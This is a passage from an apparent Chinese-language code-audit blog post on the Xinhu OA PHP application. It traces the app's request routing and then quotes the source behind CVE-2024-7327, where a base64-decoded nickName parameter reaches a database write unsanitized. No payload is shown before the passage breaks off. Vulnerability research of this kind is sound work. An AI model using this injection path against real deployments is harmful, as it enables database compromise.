class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_uurla</span>[<span class="number">1</span>]))&#123;</span><br><span class="line">		<span class="variable">$_uurla</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;&amp;&#x27;</span>, <span class="variable">$_uurla</span>[<span class="number">1</span>]);<span class="keyword">foreach</span>(<span class="variable">$_uurla</span> <span class="keyword">as</span> <span class="variable">$_uurlas</span>)&#123;</span><br><span class="line">			<span class="variable">$_uurlasa</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;=&#x27;</span>, <span class="variable">$_uurlas</span>);</span><br><span class="line">			<span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_uurlasa</span>[<span class="number">1</span>]))<span class="variable">$_GET</span>[<span class="variable">$_uurlasa</span>[<span class="number">0</span>]]=<span class="variable">$_uurlasa</span>[<span class="number">1</span>];</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">	<span class="variable">$m</span>			= <span class="variable">$rock</span>-&gt;jm-&gt;<span class="title function_ invoke__">gettoken</span>(<span class="string">&#x27;m&#x27;</span>, <span class="string">&#x27;index&#x27;</span>);</span><br><span class="line">	<span class="variable">$d</span>			= <span class="variable">$rock</span>-&gt;jm-&gt;<span class="title function_ invoke__">gettoken</span>(<span class="string">&#x27;d&#x27;</span>);</span><br><span class="line">	<span class="variable">$a</span>			= <span class="variable">$rock</span>-&gt;jm-&gt;<span class="title function_ invoke__">gettoken</span>(<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;default&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$ajaxbool</span>	= <span class="variable">$rock</span>-&gt;jm-&gt;<span class="title function_ invoke__">gettoken</span>(<span class="string">&#x27;ajaxbool&#x27;</span>, <span class="string">&#x27;false&#x27;</span>);</span><br><span class="line"><span class="variable">$mode</span>		= <span class="variable">$rock</span>-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&#x27;m&#x27;</span>, <span class="variable">$m</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$config</span>[<span class="string">&#x27;install&#x27;</span>] &amp;&amp; <span class="variable">$mode</span> != <span class="string">&#x27;install&#x27;</span>)<span class="variable">$rock</span>-&gt;<span class="title function_ invoke__">location</span>(<span class="string">&#x27;?m=install&#x27;</span>);</span><br><span class="line"><span class="keyword">include_once</span>(<span class="string">&#x27;include/View.php&#x27;</span>);</span><br></pre></td></tr></table></figure>
<p>这段代码主要涉及动态 URL 处理和页面导航逻辑的处理，包括模块（m）、动作（a）和数据（d）的参数提取。这样的逻辑通常出现在 MVC 框架或类似的动态 Web 应用中，用于决定哪个控制器和方法应该被调用<br><img src="/2024/10/03/WebSecurity/codeaudit/xinhuoaaudit/image-1.png"><br>结合访问请求，可以看到这些参数对应着MVC框架中的内容<br>最后一行<code>include_once(&#39;include/View.php&#39;);</code><br>转而看下view.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$ajaxbool</span>))<span class="variable">$ajaxbool</span> = <span class="variable">$rock</span>-&gt;jm-&gt;<span class="title function_ invoke__">gettoken</span>(<span class="string">&#x27;ajaxbool&#x27;</span>, <span class="string">&#x27;false&#x27;</span>);</span><br><span class="line"><span class="variable">$ajaxbool</span>	= <span class="variable">$rock</span>-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&#x27;ajaxbool&#x27;</span>, <span class="variable">$ajaxbool</span>);</span><br><span class="line"><span class="variable">$p</span>			= PROJECT;</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$m</span>))<span class="variable">$m</span>=<span class="string">&#x27;index&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$a</span>))<span class="variable">$a</span>=<span class="string">&#x27;default&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$d</span>))<span class="variable">$d</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$m</span>			= <span class="variable">$rock</span>-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&#x27;m&#x27;</span>, <span class="variable">$m</span>);</span><br><span class="line"><span class="variable">$a</span>			= <span class="variable">$rock</span>-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&#x27;a&#x27;</span>, <span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$d</span>			= <span class="variable">$rock</span>-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&#x27;d&#x27;</span>, <span class="variable">$d</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;M&#x27;</span>, <span class="variable">$m</span>);</span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;A&#x27;</span>, <span class="variable">$a</span>);</span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;D&#x27;</span>, <span class="variable">$d</span>);</span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;P&#x27;</span>, <span class="variable">$p</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$_m</span>			= <span class="variable">$m</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$rock</span>-&gt;<span class="title function_ invoke__">contain</span>(<span class="variable">$m</span>, <span class="string">&#x27;|&#x27;</span>))&#123;</span><br><span class="line">	<span class="variable">$_mas</span> 	= <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;|&#x27;</span>, <span class="variable">$m</span>);</span><br><span class="line">	<span class="variable">$m</span> 		= <span class="variable">$_mas</span>[<span class="number">0</span>];</span><br><span class="line">	<span class="variable">$_m</span>		= <span class="variable">$_mas</span>[<span class="number">1</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">include_once</span>(<span class="variable">$rock</span>-&gt;<span class="title function_ invoke__">strformat</span>(<span class="string">&#x27;?0/?1/?1Action.php&#x27;</span>,ROOT_PATH, <span class="variable">$p</span>));</span><br><span class="line"><span class="variable">$rand</span>		= <span class="title function_ invoke__">date</span>(<span class="string">&#x27;YmdHis&#x27;</span>).<span class="title function_ invoke__">rand</span>(<span class="number">1000</span>,<span class="number">9999</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$d</span>,-<span class="number">1</span>)!=<span class="string">&#x27;/&#x27;</span> &amp;&amp; <span class="variable">$d</span>!=<span class="string">&#x27;&#x27;</span>)<span class="variable">$d</span>.=<span class="string">&#x27;/&#x27;</span>;</span><br><span class="line"><span class="variable">$errormsg</span>	= <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$methodbool</span>	= <span class="literal">true</span>;</span><br><span class="line"><span class="variable">$actpath</span>	= <span class="variable">$rock</span>-&gt;<span class="title function_ invoke__">strformat</span>(<span class="string">&#x27;?0/?1/?2?3&#x27;</span>,ROOT_PATH, <span class="variable">$p</span>, <span class="variable">$d</span>, <span class="variable">$_m</span>);</span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;ACTPATH&#x27;</span>, <span class="variable">$actpath</span>);</span><br><span class="line"><span class="variable">$actfile</span>	= <span class="variable">$rock</span>-&gt;<span class="title function_ invoke__">strformat</span>(<span class="string">&#x27;?0/?1Action.php&#x27;</span>,<span class="variable">$actpath</span>, <span class="variable">$m</span>);</span><br><span class="line"><span class="variable">$actfile1</span>	= <span class="variable">$rock</span>-&gt;<span class="title function_ invoke__">strformat</span>(<span class="string">&#x27;?0/?1Action.php&#x27;</span>,<span class="variable">$actpath</span>, <span class="variable">$_m</span>);</span><br><span class="line"><span class="variable">$actbstr</span> 	= <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">file_exists</span>(<span class="variable">$actfile1</span>))<span class="keyword">include_once</span>(<span class="variable">$actfile1</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">file_exists</span>(<span class="variable">$actfile</span>))&#123;</span><br><span class="line">	<span class="keyword">include_once</span>(<span class="variable">$actfile</span>);</span><br><span class="line">	<span class="variable">$clsname</span>	= <span class="string">&#x27;&#x27;</span>.<span class="variable">$m</span>.<span class="string">&#x27;ClassAction&#x27;</span>;</span><br><span class="line">	<span class="variable">$xhrock</span>		= <span class="keyword">new</span> <span class="variable">$clsname</span>();</span><br><span class="line">	<span class="variable">$actname</span>	= <span class="string">&#x27;&#x27;</span>.<span class="variable">$a</span>.<span class="string">&#x27;Action&#x27;</span>;</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$ajaxbool</span> == <span class="string">&#x27;true&#x27;</span>)<span class="variable">$actname</span>	= <span class="string">&#x27;&#x27;</span>.<span class="variable">$a</span>.<span class="string">&#x27;Ajax&#x27;</span>;</span><br><span class="line">	<span class="keyword">if</span>(<span class="title function_ invoke__">method_exists</span>(<span class="variable">$xhrock</span>, <span class="variable">$actname</span>))&#123;</span><br><span class="line">		<span class="variable">$xhrock</span>-&gt;<span class="title function_ invoke__">beforeAction</span>();</span><br><span class="line">		<span class="variable">$actbstr</span> = <span class="variable">$xhrock</span>-&gt;<span class="variable">$actname</span>();</span><br><span class="line">		<span class="variable">$xhrock</span>-&gt;bodyMessage = <span class="variable">$actbstr</span>;</span><br><span class="line">		<span class="keyword">if</span>(<span class="title function_ invoke__">is_string</span>(<span class="variable">$actbstr</span>))&#123;<span class="keyword">echo</span> <span class="variable">$actbstr</span>;<span class="variable">$xhrock</span>-&gt;display=<span class="literal">false</span>;&#125;</span><br><span class="line">		<span class="keyword">if</span>(<span class="title function_ invoke__">is_array</span>(<span class="variable">$actbstr</span>))&#123;<span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>(<span class="variable">$actbstr</span>);<span class="variable">$xhrock</span>-&gt;display=<span class="literal">false</span>;&#125;</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="variable">$methodbool</span> = <span class="literal">false</span>;</span><br><span class="line">		<span class="keyword">if</span>(<span class="variable">$ajaxbool</span> == <span class="string">&#x27;false&#x27;</span>)<span class="keyword">echo</span> <span class="string">&#x27;&#x27;</span>.<span class="variable">$actname</span>.<span class="string">&#x27; not found;&#x27;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="variable">$xhrock</span>-&gt;<span class="title function_ invoke__">afterAction</span>();</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&#x27;actionfile not exists;&#x27;</span>;</span><br><span class="line">	<span class="variable">$xhrock</span>		= <span class="keyword">new</span> <span class="title class_">Action</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$_showbool</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$xhrock</span>-&gt;display &amp;&amp; (<span class="variable">$ajaxbool</span> == <span class="string">&#x27;html&#x27;</span> || <span class="variable">$ajaxbool</span> == <span class="string">&#x27;false&#x27;</span>))&#123;</span><br><span class="line">	<span class="variable">$xhrock</span>-&gt;smartydata[<span class="string">&#x27;p&#x27;</span>]	= <span class="variable">$p</span>;</span><br><span class="line">	<span class="variable">$xhrock</span>-&gt;smartydata[<span class="string">&#x27;a&#x27;</span>]	= <span class="variable">$a</span>;</span><br><span class="line">	<span class="variable">$xhrock</span>-&gt;smartydata[<span class="string">&#x27;m&#x27;</span>]	= <span class="variable">$m</span>;</span><br><span class="line">	<span class="variable">$xhrock</span>-&gt;smartydata[<span class="string">&#x27;d&#x27;</span>]	= <span class="variable">$d</span>;</span><br><span class="line">	<span class="variable">$xhrock</span>-&gt;smartydata[<span class="string">&#x27;rand&#x27;</span>]	= <span class="variable">$rand</span>;</span><br><span class="line">	<span class="variable">$xhrock</span>-&gt;smartydata[<span class="string">&#x27;qom&#x27;</span>]	= QOM;</span><br><span class="line">	<span class="variable">$xhrock</span>-&gt;smartydata[<span class="string">&#x27;path&#x27;</span>]	= PATH;</span><br><span class="line">	<span class="variable">$xhrock</span>-&gt;smartydata[<span class="string">&#x27;sysurl&#x27;</span>]= SYSURL;</span><br><span class="line">	<span class="variable">$temppath</span>					= <span class="string">&#x27;&#x27;</span>.ROOT_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$p</span>.<span class="string">&#x27;/&#x27;</span>;</span><br><span class="line">	<span class="variable">$tplpaths</span>					= <span class="string">&#x27;&#x27;</span>.<span class="variable">$temppath</span>.<span class="string">&#x27;&#x27;</span>.<span class="variable">$d</span>.<span class="string">&#x27;&#x27;</span>.<span class="variable">$m</span>.<span class="string">&#x27;/&#x27;</span>;</span><br><span class="line">	<span class="variable">$tplname</span>					= <span class="string">&#x27;tpl_&#x27;</span>.<span class="variable">$m</span>.<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$a</span>!=<span class="string">&#x27;default&#x27;</span>)<span class="variable">$tplname</span>  .= <span class="string">&#x27;_&#x27;</span>.<span class="variable">$a</span>.<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">	<span class="variable">$tplname</span>				   .= <span class="string">&#x27;.&#x27;</span>.<span class="variable">$xhrock</span>-&gt;tpldom.<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">	<span class="variable">$mpathname</span>					= <span class="variable">$tplpaths</span>.<span class="variable">$tplname</span>;</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$xhrock</span>-&gt;displayfile!=<span class="string">&#x27;&#x27;</span> &amp;&amp; <span class="title function_ invoke__">file_exists</span>(<span class="variable">$xhrock</span>-&gt;displayfile))<span class="variable">$mpathname</span> = <span class="variable">$xhrock</span>-&gt;displayfile;</span><br><span class="line">	<span class="keyword">if</span>(!<span class="title function_ invoke__">file_exists</span>(<span class="variable">$mpathname</span>) || !<span class="variable">$methodbool</span>)&#123;</span><br><span class="line">		<span class="keyword">if</span>(!<span class="variable">$methodbool</span>)&#123;</span><br><span class="line">			<span class="variable">$errormsg</span>	= <span class="string">&#x27;in (&#x27;</span>.<span class="variable">$m</span>.<span class="string">&#x27;) not found Method(&#x27;</span>.<span class="variable">$a</span>.<span class="string">&#x27;);&#x27;</span>;</span><br><span class="line">		&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="variable">$errormsg</span>	= <span class="string">&#x27;&#x27;</span>.<span class="variable">$tplname</span>.<span class="string">&#x27; not exists;&#x27;</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">echo</span> <span class="variable">$errormsg</span>;</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="variable">$_showbool</span> = <span class="literal">true</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$xhrock</span>-&gt;display &amp;&amp; (<span class="variable">$ajaxbool</span> == <span class="string">&#x27;html&#x27;</span> || <span class="variable">$xhrock</span>-&gt;tpltype==<span class="string">&#x27;html&#x27;</span> || <span class="variable">$ajaxbool</span> == <span class="string">&#x27;false&#x27;</span>) &amp;&amp; <span class="variable">$_showbool</span>)&#123;</span><br><span class="line">	<span class="variable">$xhrock</span>-&gt;<span class="title function_ invoke__">setHtmlData</span>();</span><br><span class="line">	<span class="variable">$da</span> = <span class="variable">$xhrock</span>-&gt;smartydata;</span><br><span class="line">	<span class="keyword">foreach</span>(<span class="variable">$xhrock</span>-&gt;assigndata <span class="keyword">as</span> <span class="variable">$_k</span>=&gt;<span class="variable">$_v</span>)<span class="variable">$$_k</span>=<span class="variable">$_v</span>;</span><br><span class="line">	<span class="keyword">include_once</span>(<span class="variable">$mpathname</span>);</span><br><span class="line">	<span class="variable">$_showbool</span> = <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>用于动态加载和执行 Web 应用的行动 (action) 脚本，处理 AJAX 请求，并动态加载视图模板。代码涵盖了从初始化变量、确定执行哪个控制器的哪个动作，到加载相应的 PHP 文件，以及处理和输出响应。</p>
<p>ok了 明白架构模式了 也知道了具体是怎么拼接的了 对于下面的请求：<br><code>POST /index.php?a=check&amp;m=login&amp;d=&amp;ajaxbool=true&amp;rnd=469139 </code><br>访问的是 loginClassAction 的 checkAction 方法，并且是异步请求。</p>
<h2 id="随便找个功能点"><a href="#随便找个功能点" class="headerlink" title="随便找个功能点"></a>随便找个功能点</h2><p><img src="/2024/10/03/WebSecurity/codeaudit/xinhuoaaudit/image-2.png"><br>修改密码的点，跟进去</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">editpassAction</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="keyword">if</span>(<span class="title function_ invoke__">getconfig</span>(<span class="string">&#x27;systype&#x27;</span>)==<span class="string">&#x27;demo&#x27;</span>)<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">showreturn</span>(<span class="string">&#x27;演示上不要修改&#x27;</span>);</span><br><span class="line">		<span class="variable">$id</span>			= <span class="variable language_">$this</span>-&gt;adminid;</span><br><span class="line">		<span class="variable">$oldpass</span>	= <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">post</span>(<span class="string">&#x27;passoldPost&#x27;</span>);</span><br><span class="line">		<span class="variable">$pasword</span>	= <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">post</span>(<span class="string">&#x27;passwordPost&#x27;</span>);</span><br><span class="line">		<span class="variable">$msg</span>		= <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">		<span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">isempt</span>(<span class="variable">$pasword</span>))<span class="variable">$msg</span> =<span class="string">&#x27;新密码不能为空&#x27;</span>;</span><br><span class="line">		<span class="keyword">if</span>(<span class="variable">$msg</span> == <span class="string">&#x27;&#x27;</span>)&#123;</span><br><span class="line">			<span class="variable">$oldpassa</span>	= <span class="variable language_">$this</span>-&gt;db-&gt;<span class="title function_ invoke__">getmou</span>(<span class="variable">$this</span>-&gt;<span class="title function_ invoke__">T</span>(<span class="string">&#x27;admin&#x27;</span>),<span class="string">&quot;`pass`&quot;</span>,<span class="string">&quot;`id`=&#x27;<span class="subst">$id</span>&#x27;&quot;</span>);</span><br><span class="line">			<span class="keyword">if</span>(<span class="variable">$oldpassa</span> != <span class="title function_ invoke__">md5</span>(<span class="variable">$oldpass</span>))<span class="variable">$msg</span> =<span class="string">&#x27;旧密码不正确&#x27;</span>;</span><br><span class="line">			<span class="keyword">if</span>(<span class="variable">$msg</span>==<span class="string">&#x27;&#x27;</span>)&#123;</span><br><span class="line">				<span class="keyword">if</span>(<span class="variable">$oldpassa</span> == <span class="title function_ invoke__">md5</span>(<span class="variable">$pasword</span>))<span class="variable">$msg</span> =<span class="string">&#x27;新旧密码不能相同&#x27;</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span>(<span class="variable">$msg</span> == <span class="string">&#x27;&#x27;</span>)&#123;</span><br><span class="line">			<span class="keyword">if</span>(!<span class="variable language_">$this</span>-&gt;db-&gt;<span class="title function_ invoke__">record</span>(<span class="variable">$this</span>-&gt;<span class="title function_ invoke__">T</span>(<span class="string">&#x27;admin&#x27;</span>), <span class="string">&quot;`pass`=&#x27;&quot;</span>.<span class="title function_ invoke__">md5</span>(<span class="variable">$pasword</span>).<span class="string">&quot;&#x27;,`editpass`=`editpass`+1&quot;</span>, <span class="string">&quot;`id`=&#x27;<span class="subst">$id</span>&#x27;&quot;</span>))<span class="variable">$msg</span>	= <span class="variable language_">$this</span>-&gt;db-&gt;<span class="title function_ invoke__">error</span>();</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span>(<span class="variable">$msg</span>==<span class="string">&#x27;&#x27;</span>)&#123;</span><br><span class="line">			<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">showreturn</span>(<span class="string">&#x27;success&#x27;</span>);</span><br><span class="line">		&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">showreturn</span>(<span class="string">&#x27;&#x27;</span>,<span class="variable">$msg</span>, <span class="number">201</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
<p>好像没啥能利用的，主要是输入直接被md5了<br>再多测测看</p>
<h2 id="CVE-2024-7327"><a href="#CVE-2024-7327" class="headerlink" title="CVE-2024-7327"></a>CVE-2024-7327</h2><p>还得是公开cve<br>在信呼OA系统2.6.2版本的&#x2F;webmain&#x2F;task&#x2F;openapi&#x2F;openmodhetongAction.php文件中，存在一个前台SQL注入漏洞。当$nickName变量经过base64解码后被加入到uarr数组中，并最终传递给$db-&gt;record()方法进行SQL查询时，攻击者可以利用此漏洞进行SQL注入攻击。此外，还需要注意父类openapiAction.php中的init方法</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">dataAction</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$mobile</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&#x27;mobile&#x27;</span>);</span><br><span class="line">    <span class="variable">$xcytype</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&#x27;xcytype&#x27;</span>);</span><br><span class="line">    <span class="variable">$openid</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&#x27;openid&#x27;</span>);</span><br><span class="line">    <span class="variable">$nickName</span> = <span class="variable language_">$this</span>-&gt;jm-&gt;<span class="title function_ invoke__">base64decode</span>(<span class="variable">$this</span>-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&#x27;nickName&#x27;</span>));</span><br><span class="line">    <span class="variable">$htdata</span> = <span class="keyword">array</span>();</span><br><span class="line">    <span class="variable">$db</span>   = <span class="title function_ invoke__">m</span>(<span class="string">&#x27;wxxcyus&#x27;</span>);</span><br><span class="line">    <span class="variable">$uarr</span>[<span class="string">&#x27;mobile&#x27;</span>]   = <span class="variable">$mobile</span>;</span><br><span class="line">    <span class="variable">$uarr</span>[<span class="string">&#x27;xcytype&#x27;</span>]   = <span class="variable">$xcytype</span>;</span><br><span class="line">    <span class="variable">$uarr</span>[<span class="string">&#x27;openid&#x27;</span>]   = <span class="variable">$openid</span>;</span><br><span class="line">    <span class="variable">$uarr</span>[<span class="string">&#x27;nickName&#x27;</span>]   = <span class="variable">$nickName</span>;</span><br><span class="line">    <span class="variable">$uarr</span>[<span class="string">&#x27;province&#x27;</span>]   = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&#x27;province&#x27;</span>);</span><br><span class="line">    <span class="variable">$uarr</span>[<span class="string">&#x27;city&#x27;</span>]     = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&#x27;city&#x27;</span>);</span><br><span class="line">    <span class="variable">$uarr</span>[<span class="string">&#x27;gender&#x27;</span>]   = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&#x27;gender&#x27;</span>);</span><br><span class="line">    <span class="variable">$uarr</span>[<span class="string">&#x27;dingyue&#x27;</span>]   = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&#x27;dingyue&#x27;</span>);</span><br><span class="line">    <span class="variable">$uarr</span>[<span class="string">&#x27;avatarUrl&#x27;</span>]   = <span class="variable language_">$this</span>-&gt;jm-&gt;<span class="title function_ invoke__">base64decode</span>(<span class="variable">$this</span>-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&#x27;avatarUrl&#x27;</span>));</span><br><span class="line">    <span class="variable">$where</span> = <span class="string">&quot;`openid`=&#x27;<span class="subst">$openid</span>&#x27;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$db</span>-&gt;<span class="title function_ invoke__">rows</span>(<span class="variable">$where</span>)==<span class="number">0</span>)&#123;</span><br><span class="line">      <span class="variable">$uarr</span>[<span class="string">&#x27;adddt&#x27;</span>] = <span class="variable language_">$this</span>-&gt;now;</span><br><span class="line">      <span class="variable">$where</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">      <span class="variable">$uarr</span>[<span class="string">&#x27;optdt&#x27;</span>] = <span class="variable language_">$this</span>-&gt;now;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">record</span>(<span class="variable">$uarr</span>, <span class="variable">$where</span>);</span><br></pre></td></tr></table></figure>
<p>跟进该方法 &#x2F;include&#x2F;Model.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">record</span>(<span class="params"><span class="variable">$arr</span>, <span class="variable">$where</span>=<span class="string">&#x27;&#x27;</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;db-&gt;<span class="title function_ invoke__">record</span>(<span class="variable">$this</span>-&gt;table, <span class="variable">$arr</span>, <span class="variable">$where</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>到了 &#x2F;include&#x2F;class&#x2F;mysql.php</p>
